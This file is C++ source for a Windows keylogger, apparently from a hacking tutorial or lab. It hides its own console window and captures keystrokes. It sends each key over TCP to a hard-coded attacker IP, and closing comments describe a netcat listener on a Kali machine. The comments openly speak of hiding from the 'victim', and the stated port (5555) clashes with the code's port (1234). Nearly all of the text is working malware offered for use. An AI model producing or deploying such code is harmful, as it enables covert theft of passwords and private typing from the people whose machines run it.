// 
//Description: 
// The above code would send the keystrokes (only printable characters) of the user to the attacker's 
// machine over a TCP connection, on port 5555.
//

//Explanation: We use winsock utilities and we do not want the compiler to complain about older functionalities 
//used, since the below code is sufficient for our needs.
#define _WINSOCK_DEPRECATED_NO_WARNINGS

//Explanation: We need the Ws2_32.lib library in order to use sockets (networking) functionality in Windows.
#pragma comment(lib, "Ws2_32.lib")

//Explanation: Here we have included some header files. These are:
//iostream: includes standard input/output utilities
//winsock2.h: includes networking utilities
//stdio.h: includes standard input/output utilities (needed for perror())
//stdlib.h: includes standard input/output utilities
//Windows.h: includes Windows libraries
#include <iostream>
#include <winsock2.h>
#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>


int main() {
    ShowWindow(GetConsoleWindow(), SW_HIDE); //To hide the program window so that it's not obvious to the victim that this program is running!
    char KEY; //This variable would hold a single key, for which we would check the status (if it's pressed or not).

	
    WSADATA WSAData; //This data type (it's a struct) holds information about windows socket implementation.
    SOCKET server; //This data type stores the connection of the SOCKET type.
    SOCKADDR_IN addr; //This data type (it's a struct) holds the details of socket connection.

    WSAStartup(MAKEWORD(2, 0), &WSAData); //Initialize usage of the winsock library (needed for opening a network connection).
    server = socket(AF_INET, SOCK_STREAM, 0); //Set up a TCP socket. AF_INET means address family for IPv4. SOCK_STREAM means that we want a TCP socket.


	// This would set the IP address of the target we wish to sent the data to (that would be the attacker's IP address). 
	// The port used would be 5555 and the IP address is IPv4 which is indicated by AF_INET.	
    addr.sin_addr.s_addr = inet_addr("10.10.24.3");
    addr.sin_family = AF_INET;
    addr.sin_port = htons(1234);

    connect(server, (SOCKADDR *)&addr, sizeof(addr)); //Connect to the previously set up target host/port.

	// This would run an infinite loop andkeylogger and check if any of the keys in the range (0x8 to 0xFF). 
	// Then the GetAsyncKeyState function checks if that key is in pressed state (check the 2nd point of the note below). 
	// If the key we checked for is in pressed state, send the pressed key's ASCII value to the attacker over the established TCP socket.
    while (true) {
        Sleep(20); //That would prevent this keylogger to consume a lot of CPU cycles and thus prevent spiking the CPU usage, which could slow down the machine and even give an indication to the victim that something unusual is wrong on!
		for ( KEY=8; KEY<255; KEY++) {
			if ( GetAsyncKeyState(KEY) == -32767 ) {
                char buffer[2];
				if ( ( KEY > 64 ) && ( KEY < 91) && !(GetAsyncKeyState(0x10) ))  {  
					KEY+=32;
 	            	buffer[0] = KEY;
 	            	send(server, buffer, sizeof(buffer), 0);
					break;
				} else if  ( ( KEY > 64 ) && ( KEY < 91) ) {
 	            	buffer[0] = KEY;
 	            	send(server, buffer, sizeof(buffer), 0);				
					break;		
				} else {
					switch(KEY) {
						case 48: 
							if (GetAsyncKeyState(0x10)) {
								KEY=61;
							} 
							break;
						case 49: 
							if (GetAsyncKeyState(0x10)) {
								KEY=33;
							} 
							break;
						case 50: 
							if (GetAsyncKeyState(0x10)) {
								KEY=34;
							} 
							break;
						case 51: 
							if (GetAsyncKeyState(0x10)) {
								KEY=46;
							} 
							break;
						case 52: 
							if (GetAsyncKeyState(0x10)) {
								KEY=36;
							} 
							break;
						case 53: 
							if (GetAsyncKeyState(0x10)) {
								KEY=37;
							} 
							break;
						case 54: 
							if (GetAsyncKeyState(0x10)) {
								KEY=38;
							} 
							break;
						case 55: 
							if (GetAsyncKeyState(0x10)) {
								KEY=47;
							} 
							break;
						case 56: 
							if (GetAsyncKeyState(0x10)) {
								KEY=40;
							} 
							break;
						case 57: 
							if (GetAsyncKeyState(0x10)) {
								KEY=41;
							} 
							break;
						case VK_LBUTTON: 
							KEY=174;
							break;
						case VK_RBUTTON: 
							KEY=175;
							break;
						case VK_MBUTTON: 
							KEY=186;
							break;
						case VK_BACK: 
							KEY=8;
							break;
						case VK_TAB: 
							KEY=9;
							break;
						case VK_RETURN: 
							KEY=13;
							break;
						case VK_CONTROL: 
							KEY=17;
							break;
						case VK_MENU: 
							KEY=0;
							break;
						case VK_CAPITAL: 
							KEY=26;
							break;
						case VK_ESCAPE: 
							KEY=27;
							break;
						case VK_SPACE: 
							KEY=32;
							break;
						case VK_DELETE: 
							KEY=127;
							break;
						case VK_SHIFT: 
							KEY=14;
							break;
					}
	            	buffer[0] = KEY;
 	            	send(server, buffer, sizeof(buffer), 0);
					break;
				}
			}
		}

    }
    closesocket(server); //Close the socket.
    WSACleanup(); // Clean up the Winsock library components.
}
    
    // To execute it:
    // In Dev-C++, open Tools -> Compiler Options...: Add the flag -lws2_32 for the linker:
	// This flag would be required to include the windows socket library with our C++ code.
	// Now, we can compile the code by clicking on the Compile button in the top panel:
	// Set up a netcat listener on port 5555 on the attacker (Kali) machine: nc -lvp 5555
	// Now we can run the compiled code in the Windows machine:



